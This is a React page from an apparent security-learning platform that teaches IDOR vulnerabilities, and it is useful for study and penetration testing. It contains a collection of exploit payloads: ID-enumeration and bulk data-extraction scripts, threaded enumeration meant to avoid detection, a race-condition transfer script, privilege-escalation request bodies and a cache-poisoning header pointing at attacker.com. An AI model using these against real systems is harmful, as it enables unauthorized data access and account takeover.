import React, { useState, useEffect } from 'react';

import Sidebar from '../../components/navigation/Sidebar';
import Breadcrumb from '../../components/navigation/Breadcrumb';
import GlobalSearch from '../../components/navigation/GlobalSearch';
import VulnerabilityHero from './components/VulnerabilityHero';
import ConceptCard from './components/ConceptCard';
import { ModeToggle, RelatedVulnerabilities, Logo } from '../../components/shared';
import FilterChips from './components/FilterChips';
import PayloadCard from './components/PayloadCard';
import TechniqueSection from './components/TechniqueSection';
import TipsSection from './components/TipsSection';
import Icon from '../../components/AppIcon';

const IDORVulnerabilityDetails = () => {
  const [isProMode, setIsProMode] = useState(false);
  const [activeFilter, setActiveFilter] = useState('all');
  const [filteredPayloads, setFilteredPayloads] = useState([]);

  const concepts = [
    {
      icon: "FileSearch",
      title: "Direct Object Reference",
      description: "IDOR occurs when applications expose internal implementation objects like database keys, file paths, or user IDs directly in URLs or parameters without proper authorization checks.",
      examples: [
        "/api/user/profile?id=12345",
        "/documents/view?file=invoice_2024.pdf",
        "/admin/users/edit/789"
      ]
    },
    {
      icon: "ShieldAlert",
      title: "Authorization Bypass",
      description: "Attackers manipulate object references to access resources belonging to other users or perform unauthorized actions by changing predictable identifiers.",
      examples: [
        "Changing user_id parameter to access other profiles",
        "Modifying document IDs to view private files",
        "Altering order numbers to access other transactions"
      ]
    },
    {
      icon: "TrendingUp",
      title: "Privilege Escalation",
      description: "IDOR can lead to horizontal privilege escalation (accessing peer resources) or vertical escalation (accessing admin functions) by manipulating reference parameters.",
      examples: [
        "Regular user accessing admin panel via role_id change",
        "Customer viewing other customers\' orders",
        "User modifying system configuration files"
      ]
    },
    {
      icon: "Database",
      title: "Sequential ID Enumeration",
      description: "Many applications use sequential or predictable identifiers, making it easy for attackers to enumerate and access all objects by iterating through ID ranges.",
      examples: [
        "User IDs: 1, 2, 3, 4...",
        "Invoice numbers: INV-001, INV-002...",
        "Document paths: /files/doc1.pdf, /files/doc2.pdf..."
      ]
    }
  ];

  const filters = [
    { id: 'all', label: 'All Payloads', icon: 'Grid', count: 24 },
    { id: 'parameter', label: 'Parameter Manipulation', icon: 'Settings', count: 8 },
    { id: 'enumeration', label: 'ID Enumeration', icon: 'Hash', count: 6 },
    { id: 'privilege', label: 'Privilege Escalation', icon: 'TrendingUp', count: 5 },
    { id: 'api', label: 'API Exploitation', icon: 'Code', count: 5 }
  ];

  const payloads = [
    {
      id: 1,
      title: "Basic User ID Manipulation",
      description: "Simple parameter tampering to access other user profiles by changing the user ID in the URL.",
      code: "GET /api/user/profile?user_id=12345\nGET /api/user/profile?user_id=12346\nGET /api/user/profile?user_id=12347",
      method: "GET",
      difficulty: "Easy",
      category: "Parameter Manipulation",
      successRate: 85,
      context: "Works on applications that use predictable user IDs without proper authorization checks. Test by incrementing/decrementing ID values.",
      targetApps: ["Social Media", "E-commerce", "SaaS Platforms"],
      filter: 'parameter'
    },
    {
      id: 2,
      title: "Document Access via File Path",
      description: "Manipulating file paths or document IDs to access private files belonging to other users.",
      code: "/documents/view?file=user123_invoice.pdf\n/documents/view?file=user124_invoice.pdf\n/documents/view?file=../admin/config.pdf",
      method: "GET",
      difficulty: "Easy",
      category: "Parameter Manipulation",
      successRate: 78,
      context: "Common in document management systems. Try path traversal combined with IDOR for deeper access.",
      targetApps: ["Document Management", "Cloud Storage", "Financial Apps"],
      filter: 'parameter'
    },
    {
      id: 3,
      title: "Order ID Enumeration",
      description: "Sequential enumeration of order IDs to access transaction details of other customers.",
      code: "GET /api/orders/12345\nGET /api/orders/12346\nGET /api/orders/12347\n\nfor i in range(10000, 20000):\n    requests.get(f'/api/orders/{i}')",
      method: "GET",
      difficulty: "Easy",
      category: "ID Enumeration",
      successRate: 82,
      context: "E-commerce platforms often use sequential order numbers. Automate enumeration to extract bulk data.",
      targetApps: ["E-commerce", "Retail", "Booking Systems"],
      filter: 'enumeration'
    },
    {
      id: 4,
      title: "Role-Based Access Bypass",
      description: "Changing role or permission parameters to escalate privileges from regular user to admin.",
      code: "POST /api/user/update\n{\n  \"user_id\": 12345,\n  \"role\": \"admin\",\n  \"permissions\": [\"read\", \"write\", \"delete\"]\n}",
      method: "POST",
      difficulty: "Medium",
      category: "Privilege Escalation",
      successRate: 65,
      context: "Test on user profile update endpoints. Some apps trust client-side role assignments without server validation.",
      targetApps: ["Admin Panels", "CMS", "Enterprise Apps"],
      filter: 'privilege'
    },
    {
      id: 5,
      title: "API Key Extraction via User ID",
      description: "Accessing API keys or tokens of other users by manipulating user identifiers in API endpoints.",
      code: "GET /api/user/settings?user_id=12345\nResponse: {\"api_key\": \"sk_live_abc123...\"}\n\nGET /api/user/settings?user_id=12346\nResponse: {\"api_key\": \"sk_live_xyz789...\"}",
      method: "GET",
      difficulty: "Medium",
      category: "API Exploitation",
      successRate: 72,
      context: "Critical vulnerability in API platforms. Extracted keys can be used for further attacks or account takeover.",
      targetApps: ["API Platforms", "Payment Gateways", "Cloud Services"],
      filter: 'api'
    },
    {
      id: 6,
      title: "Batch Request IDOR",
      description: "Exploiting batch API endpoints to retrieve multiple unauthorized resources in a single request.",
      code: "POST /api/batch\n{\n  \"requests\": [\n    {\"method\": \"GET\", \"url\": \"/user/12345\"},\n    {\"method\": \"GET\", \"url\": \"/user/12346\"},\n    {\"method\": \"GET\", \"url\": \"/user/12347\"}\n  ]\n}",
      method: "POST",
      difficulty: "Medium",
      category: "API Exploitation",
      successRate: 68,
      context: "Batch endpoints often have weaker authorization checks. Can extract large amounts of data efficiently.",
      targetApps: ["GraphQL APIs", "REST APIs", "Microservices"],
      filter: 'api'
    },
    {
      id: 7,
      title: "UUID Prediction Attack",
      description: "Exploiting weak UUID generation to predict and access resources with supposedly random identifiers.",
      code: "# Analyze UUID pattern\nGET /api/resource/550e8400-e29b-41d4-a716-446655440000\nGET /api/resource/550e8400-e29b-41d4-a716-446655440001\n\n# Predict next UUIDs based on timestamp",
      method: "GET",
      difficulty: "Hard",
      category: "ID Enumeration",
      successRate: 45,
      context: "Some implementations use predictable UUID v1 (timestamp-based). Analyze patterns to predict valid UUIDs.",
      targetApps: ["Modern APIs", "Microservices", "Cloud Platforms"],
      filter: 'enumeration'
    },
    {
      id: 8,
      title: "GraphQL IDOR via Nested Queries",
      description: "Exploiting GraphQL\'s nested query structure to access unauthorized related objects.",
      code: "query {\n  user(id: 12345) {\n    name\n    email\n    orders {\n      id\n      total\n      items {\n        product\n        price\n      }\n    }\n    privateDocuments {\n      filename\n      url\n    }\n  }\n}",
      method: "POST",
      difficulty: "Hard",
      category: "API Exploitation",
      successRate: 58,
      context: "GraphQL allows deep nested queries. Authorization checks often missing on nested objects.",
      targetApps: ["GraphQL APIs", "Modern Web Apps", "Mobile Backends"],
      filter: 'api'
    },
    {
      id: 9,
      title: "Mass Assignment IDOR",
      description: "Combining mass assignment vulnerability with IDOR to modify unauthorized user attributes.",
      code: "PUT /api/user/12345\n{\n  \"email\": \"attacker@evil.com\",\n  \"is_admin\": true,\n  \"account_balance\": 999999,\n  \"verified\": true\n}",
      method: "PUT",
      difficulty: "Hard",
      category: "Privilege Escalation",
      successRate: 52,
      context: "Test all possible fields in update requests. Some apps don't whitelist allowed fields for modification.",
      targetApps: ["Web Applications", "Mobile APIs", "SaaS Platforms"],
      filter: 'privilege'
    },
    {
      id: 10,
      title: "Cookie-Based IDOR",
      description: "Manipulating user identifiers stored in cookies to access other user sessions or data.",
      code: "Cookie: user_id=12345; session=abc123\n\n# Change cookie value\nCookie: user_id=12346; session=abc123\n\nGET /dashboard",
      method: "GET",
      difficulty: "Medium",
      category: "Parameter Manipulation",
      successRate: 62,
      context: "Some apps trust cookie values without validation. Modify user_id in cookies to access other accounts.",
      targetApps: ["Legacy Apps", "Session-Based Auth", "Web Portals"],
      filter: 'parameter'
    },
    {
      id: 11,
      title: "Hidden Parameter Discovery",
      description: "Finding and exploiting hidden or undocumented parameters that control object access.",
      code: "# Normal request\nGET /api/profile\n\n# With hidden parameter\nGET /api/profile?user_id=12345\nGET /api/profile?uid=12345\nGET /api/profile?account=12345",
      method: "GET",
      difficulty: "Medium",
      category: "Parameter Manipulation",
      successRate: 70,
      context: "Use parameter fuzzing to discover hidden fields. Common names: user_id, uid, account, profile_id.",
      targetApps: ["Web APIs", "Mobile Backends", "Legacy Systems"],
      filter: 'parameter'
    },
    {
      id: 12,
      title: "Referrer-Based IDOR",
      description: "Exploiting applications that use HTTP Referer header for authorization decisions.",
      code: "GET /api/admin/users/12345\nReferer: https://app.com/admin/dashboard\n\n# Spoof referer to bypass checks\nReferer: https://app.com/admin/users",
      method: "GET",
      difficulty: "Easy",
      category: "Parameter Manipulation",
      successRate: 75,
      context: "Some apps check Referer header for authorization. Easily spoofed and should never be trusted.",
      targetApps: ["Legacy Web Apps", "Admin Panels", "Internal Tools"],
      filter: 'parameter'
    },
    {
      id: 13,
      title: "Numeric ID Brute Force",
      description: "Systematic enumeration of numeric identifiers to discover and access all resources.",
      code: "import requests\n\nfor user_id in range(1, 100000):\n    response = requests.get(\n        f'https://api.example.com/user/{user_id}',\n        headers={'Authorization': 'Bearer token'}\n    )\n    if response.status_code == 200:\n        print(f'Found: {user_id}')",
      method: "GET",
      difficulty: "Easy",
      category: "ID Enumeration",
      successRate: 88,
      context: "Automate enumeration with rate limiting awareness. Can extract entire user database.",
      targetApps: ["Any App with Sequential IDs", "APIs", "Web Services"],
      filter: 'enumeration'
    },
    {
      id: 14,
      title: "Base64 Encoded ID Manipulation",
      description: "Decoding and manipulating Base64-encoded identifiers to access unauthorized resources.",
      code: "# Original: /api/user/MTIzNDU= (12345 in base64)\nimport base64\n\n# Decode\noriginal = base64.b64decode('MTIzNDU=')  # 12345\n\n# Modify and encode\nnew_id = base64.b64encode(b'12346')  # MTIzNDY=\n\nGET /api/user/MTIzNDY=",
      method: "GET",
      difficulty: "Easy",
      category: "ID Enumeration",
      successRate: 80,
      context: "Base64 encoding is not encryption. Decode, modify, re-encode to access other resources.",
      targetApps: ["Web APIs", "Mobile Apps", "SaaS Platforms"],
      filter: 'enumeration'
    },
    {
      id: 15,
      title: "JWT Claims Manipulation",
      description: "Modifying JWT token claims to change user identity or permissions without proper signature validation.",
      code: "# Original JWT payload\n{\n  \"user_id\": 12345,\n  \"role\": \"user\",\n  \"exp\": 1735000000\n}\n\n# Modified payload\n{\n  \"user_id\": 1,\n  \"role\": \"admin\",\n  \"exp\": 1735000000\n}\n\n# Re-encode and test if signature validation is weak",
      method: "POST",
      difficulty: "Hard",
      category: "Privilege Escalation",
      successRate: 48,
      context: "Test if app validates JWT signatures. Some apps only decode without verification.",
      targetApps: ["Modern Web Apps", "APIs", "Microservices"],
      filter: 'privilege'
    },
    {
      id: 16,
      title: "Wildcard IDOR via Array Parameters",
      description: "Using array parameters or wildcards to access multiple unauthorized resources simultaneously.",
      code: "GET /api/users?ids[]=12345&ids[]=12346&ids[]=12347\n\nPOST /api/delete\n{\n  \"user_ids\": [12345, 12346, 12347, 12348]\n}",
      method: "GET/POST",
      difficulty: "Medium",
      category: "API Exploitation",
      successRate: 66,
      context: "Array parameters often have weaker validation. Can access or modify multiple resources at once.",
      targetApps: ["REST APIs", "GraphQL", "Batch Endpoints"],
      filter: 'api'
    },
    {
      id: 17,
      title: "Time-Based IDOR Enumeration",
      description: "Using timing attacks to enumerate valid resource IDs based on response time differences.",
      code: "import time\n\nfor user_id in range(1, 10000):\n    start = time.time()\n    response = requests.get(f'/api/user/{user_id}')\n    elapsed = time.time() - start\n    \n    # Valid IDs take longer to process\n    if elapsed > 0.5:\n        print(f'Valid ID: {user_id}')",
      method: "GET",
      difficulty: "Hard",
      category: "ID Enumeration",
      successRate: 42,
      context: "Response time differences can reveal valid IDs even when error messages are identical.",
      targetApps: ["High-Security Apps", "Banking", "Healthcare"],
      filter: 'enumeration'
    },
    {
      id: 18,
      title: "HTTP Method Override IDOR",
      description: "Using HTTP method override headers to bypass authorization checks on restricted endpoints.",
      code: "POST /api/user/12345\nX-HTTP-Method-Override: DELETE\n\nPOST /api/admin/users/12345\nX-HTTP-Method-Override: PUT\nContent-Type: application/json\n\n{\"role\": \"admin\"}",
      method: "POST",
      difficulty: "Medium",
      category: "Privilege Escalation",
      successRate: 60,
      context: "Some frameworks support method override headers. Authorization checks may only apply to original method.",
      targetApps: ["REST APIs", "Web Frameworks", "Legacy Systems"],
      filter: 'privilege'
    },
    {
      id: 19,
      title: "Subdomain IDOR Exploitation",
      description: "Accessing resources across different subdomains using the same user identifiers.",
      code: "# Main app\nGET https://app.example.com/user/12345\n\n# Try other subdomains\nGET https://admin.example.com/user/12345\nGET https://api.example.com/user/12345\nGET https://internal.example.com/user/12345",
      method: "GET",
      difficulty: "Medium",
      category: "Parameter Manipulation",
      successRate: 64,
      context: "Different subdomains may have different authorization implementations. Test all discovered subdomains.",
      targetApps: ["Multi-tenant Apps", "Enterprise Platforms", "SaaS"],
      filter: 'parameter'
    },
    {
      id: 20,
      title: "WebSocket IDOR",
      description: "Exploiting IDOR vulnerabilities in WebSocket connections to access real-time data of other users.",
      code: "// Connect to WebSocket\nws = new WebSocket('wss://app.com/ws');\n\n// Subscribe to other user's channel\nws.send(JSON.stringify({\n  \"action\": \"subscribe\",\n  \"user_id\": 12346,\n  \"channel\": \"private_messages\"\n}));",
      method: "WebSocket",
      difficulty: "Hard",
      category: "API Exploitation",
      successRate: 50,
      context: "WebSocket authorization often overlooked. Can access real-time notifications, messages, or updates.",
      targetApps: ["Chat Apps", "Real-time Dashboards", "Collaboration Tools"],
      filter: 'api'
    },
    {
      id: 21,
      title: "File Upload IDOR",
      description: "Manipulating file upload paths or IDs to overwrite or access files belonging to other users.",
      code: "POST /api/upload\nContent-Type: multipart/form-data\n\n--boundary\nContent-Disposition: form-data; name=\"user_id\"\n\n12346\n--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious.pdf\"\n\n[file content]",
      method: "POST",
      difficulty: "Medium",
      category: "Parameter Manipulation",
      successRate: 68,
      context: "File upload endpoints may not validate user_id parameter. Can overwrite other users\' files.",
      targetApps: ["Document Management", "Cloud Storage", "Profile Systems"],
      filter: 'parameter'
    },
    {
      id: 22,
      title: "OAuth Token IDOR",
      description: "Exploiting OAuth implementation flaws to access tokens or resources of other users.",
      code: "# Authorization code flow\nGET /oauth/authorize?client_id=123&user_id=12346\n\n# Token exchange\nPOST /oauth/token\n{\n  \"code\": \"auth_code\",\n  \"user_id\": 12346\n}",
      method: "GET/POST",
      difficulty: "Hard",
      category: "Privilege Escalation",
      successRate: 44,
      context: "OAuth flows may not properly bind authorization codes to users. Test user_id manipulation.",
      targetApps: ["OAuth Providers", "SSO Systems", "API Platforms"],
      filter: 'privilege'
    },
    {
      id: 23,
      title: "Cache Poisoning IDOR",
      description: "Using cache poisoning techniques combined with IDOR to serve unauthorized content to other users.",
      code: "GET /api/user/profile HTTP/1.1\nHost: app.com\nX-Forwarded-Host: attacker.com\nX-Original-URL: /api/user/12346\n\n# Cache serves user 12346's data to user 12345",
      method: "GET",
      difficulty: "Hard",
      category: "API Exploitation",
      successRate: 38,
      context: "Combine cache poisoning with IDOR for persistent attacks. Affects multiple users.",
      targetApps: ["CDN-backed Apps", "High-traffic Sites", "APIs"],
      filter: 'api'
    },
    {
      id: 24,
      title: "Race Condition IDOR",
      description: "Exploiting race conditions in concurrent requests to bypass authorization checks.",
      code: "import threading\nimport requests\n\ndef exploit():\n    requests.post('/api/transfer', json={\n        \"from_user\": 12345,\n        \"to_user\": 12346,\n        \"amount\": 1000\n    })\n\n# Send 100 concurrent requests\nthreads = [threading.Thread(target=exploit) for _ in range(100)]\nfor t in threads: t.start()",
      method: "POST",
      difficulty: "Hard",
      category: "Privilege Escalation",
      successRate: 40,
      context: "Race conditions can bypass authorization checks during concurrent operations. Test critical endpoints.",
      targetApps: ["Financial Apps", "E-commerce", "Booking Systems"],
      filter: 'privilege'
    }
  ];

  const techniques = [
    {
      icon: "Search",
      title: "Reconnaissance & Discovery",
      description: "Systematic approach to identifying IDOR vulnerabilities through endpoint analysis and parameter discovery.",
      steps: [
        {
          title: "Map All Endpoints",
          description: "Create a comprehensive list of all API endpoints and web pages that accept user-controllable identifiers.",
          example: "/api/user/{id}\n/documents/view?file={name}\n/orders/{order_id}\n/admin/users/{user_id}/edit"
        },
        {
          title: "Identify Parameter Types",
          description: "Categorize parameters by type: numeric IDs, UUIDs, Base64-encoded values, hashed identifiers, or file paths.",
          example: "Numeric: user_id=12345\nUUID: resource_id=550e8400-e29b-41d4-a716-446655440000\nBase64: token=MTIzNDU=\nHash: session=5f4dcc3b5aa765d61d8327deb882cf99"
        },
        {
          title: "Test Authorization Boundaries",
          description: "For each endpoint, test if changing identifiers allows access to resources belonging to other users or roles.",
          example: "# As regular user\nGET /api/user/12345/profile → 200 OK\n\n# Try other user\nGET /api/user/12346/profile → 200 OK (IDOR!)\n\n# Try admin\nGET /api/user/1/profile → 403 Forbidden (Protected)"
        },
        {
          title: "Document Vulnerable Patterns",
          description: "Record all vulnerable endpoints, parameter names, and access patterns for comprehensive reporting.",
          example: "Vulnerable: /api/orders/{id} - No authorization check\nVulnerable: /documents/view?file={path} - Path traversal + IDOR\nSecure: /api/admin/users/{id} - Proper role validation"
        }
      ]
    },
    {
      icon: "Code",
      title: "Automated Enumeration",
      description: "Building efficient scripts to systematically enumerate and extract data from IDOR-vulnerable endpoints.",
      steps: [
        {
          title: "Setup Request Template",
          description: "Create a base request template with proper headers, authentication, and rate limiting considerations.",
          example: "import requests\nimport time\n\nheaders = {\n    'Authorization': 'Bearer YOUR_TOKEN',\n    'User-Agent': 'Mozilla/5.0...'\n}\n\nbase_url = 'https://api.example.com'"
        },
        {
          title: "Implement ID Generation",
          description: "Develop logic to generate valid identifiers based on observed patterns: sequential, UUID, or custom formats.",
          example: "# Sequential\nfor user_id in range(1, 100000):\n    test_endpoint(user_id)\n\n# UUID v4 brute force (impractical)\n# Focus on UUID v1 (timestamp-based)\nimport uuid\nfor timestamp in range(start, end):\n    test_uuid = uuid.uuid1(node=node, clock_seq=seq)"
        },
        {
          title: "Handle Responses",
          description: "Parse responses to identify successful access, extract data, and handle errors or rate limiting.",
          example: "response = requests.get(url, headers=headers)\n\nif response.status_code == 200:\n    data = response.json()\n    save_to_file(data)\nelif response.status_code == 429:\n    time.sleep(60)  # Rate limited\nelif response.status_code == 403:\n    # Authorization check present\n    pass"
        },
        {
          title: "Optimize Performance",
          description: "Use threading, async requests, or distributed systems to speed up enumeration while avoiding detection.",
          example: "from concurrent.futures import ThreadPoolExecutor\n\ndef test_id(user_id):\n    # Test logic here\n    pass\n\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    executor.map(test_id, range(1, 100000))"
        }
      ]
    },
    {
      icon: "Shield",
      title: "Bypass Techniques",
      description: "Advanced methods to circumvent common IDOR protection mechanisms and access control implementations.",
      steps: [
        {
          title: "Parameter Encoding Bypass",
          description: "Try different encoding methods to bypass input validation: URL encoding, Base64, hex, or double encoding.",
          example: "Original: /api/user/12345\nURL encoded: /api/user/%31%32%33%34%35\nBase64: /api/user/MTIzNDU=\nDouble encoded: /api/user/%2531%2532%2533%2534%2535"
        },
        {
          title: "HTTP Method Manipulation",
          description: "Test different HTTP methods and method override headers to find authorization gaps.",
          example: "GET /api/user/12345 → 403 Forbidden\nPOST /api/user/12345 → 200 OK\n\nPOST /api/user/12345\nX-HTTP-Method-Override: DELETE → 200 OK"
        },
        {
          title: "Content-Type Confusion",
          description: "Change Content-Type headers to bypass validation or trigger different code paths.",
          example: "POST /api/user/12345\nContent-Type: application/json\n{\"role\": \"admin\"} → 403\n\nPOST /api/user/12345\nContent-Type: application/x-www-form-urlencoded\nrole=admin → 200 OK"
        },
        {
          title: "Path Traversal Combination",
          description: "Combine IDOR with path traversal techniques to access files or directories outside intended scope.",
          example: "/documents/view?file=user123_doc.pdf\n/documents/view?file=../user124_doc.pdf\n/documents/view?file=../../admin/config.json"
        }
      ]
    }
  ];

  const tips = [
    {
      icon: "Lightbulb",
      title: "Common IDOR Locations",
      description: "Focus testing efforts on these high-probability areas where IDOR vulnerabilities frequently occur.",
      examples: [
        "User profile endpoints (/api/user/{id})",
        "Document/file access URLs (/files/view?id={id})",
        "Order and transaction pages (/orders/{id})",
        "Admin panels and management interfaces",
        "API endpoints with numeric or UUID parameters",
        "File upload and download functionality"
      ]
    },
    {
      icon: "Target",
      title: "Testing Methodology",
      description: "Follow this systematic approach to ensure comprehensive IDOR vulnerability assessment.",
      examples: [
        "Create two test accounts with different privileges",
        "Perform actions with Account A and capture requests",
        "Replay requests with Account B\'s session",
        "Test both horizontal (peer) and vertical (privilege) access",
        "Document all successful unauthorized access attempts",
        "Test with no authentication to find public IDOR"
      ]
    },
    {
      icon: "AlertTriangle",
      title: "Red Flags to Watch",
      description: "These indicators suggest potential IDOR vulnerabilities that warrant deeper investigation.",
      examples: [
        "Sequential numeric IDs in URLs or parameters",
        "Predictable file paths or document names",
        "User IDs visible in client-side code or responses",
        "Lack of authorization checks in API responses",
        "Same endpoint accessible with different user IDs",
        "Error messages revealing valid vs invalid IDs"
      ]
    },
    {
      icon: "Zap",
      title: "Quick Win Strategies",
      description: "Efficient techniques to quickly identify and exploit IDOR vulnerabilities during time-limited assessments.",
      examples: [
        "Test with user_id=1 or admin=true parameters",
        "Increment/decrement IDs by 1 in all requests",
        "Use Burp Intruder for automated ID fuzzing",
        "Check if changing HTTP method bypasses checks",
        "Test batch endpoints with multiple IDs",
        "Look for hidden parameters in JavaScript files"
      ]
    }
  ];

  const relatedVulnerabilities = [
    {
      id: 1,
      name: "XSS Vulnerability",
      path: "/xss",
      description: "Cross-Site Scripting attacks that inject malicious scripts into web applications.",
      icon: "Code",
      severity: "critical"
    },
    {
      id: 2,
      name: "CRLF Injection",
      path: "/crlf-injection",
      description: "Carriage Return Line Feed injection for HTTP response splitting attacks.",
      icon: "FileText",
      severity: "medium"
    },
    {
      id: 3,
      name: "All Vulnerabilities",
      path: "/vulnerabilities-overview",
      description: "Comprehensive collection of web application vulnerabilities and attack vectors.",
      icon: "Shield",
      severity: "high"
    }
  ];

  useEffect(() => {
    if (activeFilter === 'all') {
      setFilteredPayloads(payloads);
    } else {
      setFilteredPayloads(payloads?.filter(p => p?.filter === activeFilter));
    }
  }, [activeFilter]);

  return (
    <div className="min-h-screen bg-background overflow-x-hidden">
      <Sidebar />
      
      <main className="lg:ml-[280px] min-h-screen lg:w-[calc(100%-280px)] w-full overflow-x-hidden">
        <div className="sticky top-0 z-40 bg-background/95 backdrop-blur-md border-b border-border">
          <div className="pl-16 pr-4 sm:px-6 lg:px-8 py-3 sm:py-4">
            <div className="flex items-center gap-3 sm:gap-4 mb-3 sm:mb-4">
              <Breadcrumb />
            </div>
            <div className="w-full max-w-full">
              <GlobalSearch />
            </div>
          </div>
        </div>

        <div className="px-4 sm:px-6 lg:px-8 py-4 sm:py-6 lg:py-8">
          <div className="max-w-7xl mx-auto">
            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4 mb-6 md:mb-8">
              <div>
                <h2 className="text-xl md:text-2xl font-semibold text-foreground mb-2">
                  Vulnerability Deep Dive
                </h2>
                <p className="text-sm md:text-base text-muted-foreground">
                  Comprehensive analysis and exploitation techniques
                </p>
              </div>
              <ModeToggle 
                mode={isProMode ? 'pro' : 'beginner'} 
                onToggle={(mode) => setIsProMode(mode === 'pro')} 
              />
            </div>
            
            <VulnerabilityHero />

            <div className="mb-6 md:mb-8">
              <h2 className="text-xl md:text-2xl lg:text-3xl font-bold text-foreground mb-4 md:mb-6">
                Core Concepts
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-2 gap-4 md:gap-5 lg:gap-6">
                {concepts?.map((concept, index) => (
                  <ConceptCard key={index} {...concept} />
                ))}
              </div>
            </div>

            <div className="mb-6 md:mb-8">
              <h2 className="text-xl md:text-2xl lg:text-3xl font-bold text-foreground mb-4 md:mb-6">
                Exploit Payloads
              </h2>

              <FilterChips
                filters={filters}
                activeFilter={activeFilter}
                onFilterChange={setActiveFilter}
              />

              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-2 gap-4 md:gap-5 lg:gap-6">
                {filteredPayloads?.map((payload) => (
                  <PayloadCard key={payload?.id} payload={payload} isProMode={isProMode} />
                ))}
              </div>
            </div>

            <section className="mb-12 md:mb-16 lg:mb-20">
              <div className="flex items-center gap-3 md:gap-4 mb-6 md:mb-8">
                <Icon name="Wrench" size={24} className="md:w-7 md:h-7 lg:w-8 lg:h-8" color="var(--color-accent)" />
                <h2 className="text-xl md:text-2xl lg:text-3xl font-bold text-foreground">
                  Exploitation Techniques
                </h2>
              </div>
              <div className="space-y-4 md:space-y-5 lg:space-y-6">
                {techniques?.map((technique, index) => (
                  <TechniqueSection key={index} technique={technique} />
                ))}
              </div>
            </section>

            <section className="mb-12 md:mb-16 lg:mb-20">
              <div className="flex items-center gap-3 md:gap-4 mb-6 md:mb-8">
                <Icon name="Sparkles" size={24} className="md:w-7 md:h-7 lg:w-8 lg:h-8" color="var(--color-accent-green)" />
                <h2 className="text-xl md:text-2xl lg:text-3xl font-bold text-foreground">
                  Pro Tips & Strategies
                </h2>
              </div>
              <TipsSection tips={tips} />
            </section>

            <section className="mb-12">
              <div className="flex items-center gap-3 md:gap-4 mb-6 md:mb-8">
                <Icon name="Link" size={24} className="md:w-7 md:h-7 lg:w-8 lg:h-8" color="var(--color-accent)" />
                <h2 className="text-xl md:text-2xl lg:text-3xl font-bold text-foreground">
                  Related Vulnerabilities
                </h2>
              </div>
              <RelatedVulnerabilities vulnerabilities={relatedVulnerabilities} />
            </section>
          </div>
        </div>

        <footer className="border-t border-border mt-12 md:mt-16 lg:mt-20">
          <div className="px-4 md:px-6 lg:px-8 py-6 md:py-8 lg:py-10">
            <div className="flex flex-col md:flex-row items-center justify-between gap-4 md:gap-6">
              <div className="flex items-center gap-3 md:gap-4">
                <div className="footer-logo w-10 h-10 md:w-12 md:h-12 flex items-center justify-center">
                  <Logo size={40} className="logo-svg" />
                </div>
                <div>
                  <p className="text-sm md:text-base font-semibold text-foreground">TrinetLayer</p>
                  <p className="text-xs md:text-sm text-muted-foreground">Security Research Platform</p>
                </div>
              </div>
              <p className="text-xs md:text-sm text-muted-foreground font-medium">
                © {new Date()?.getFullYear()} Trinet_Layer. All rights reserved.
              </p>
            </div>
          </div>
        </footer>
      </main>
    </div>
  );
};

export default IDORVulnerabilityDetails;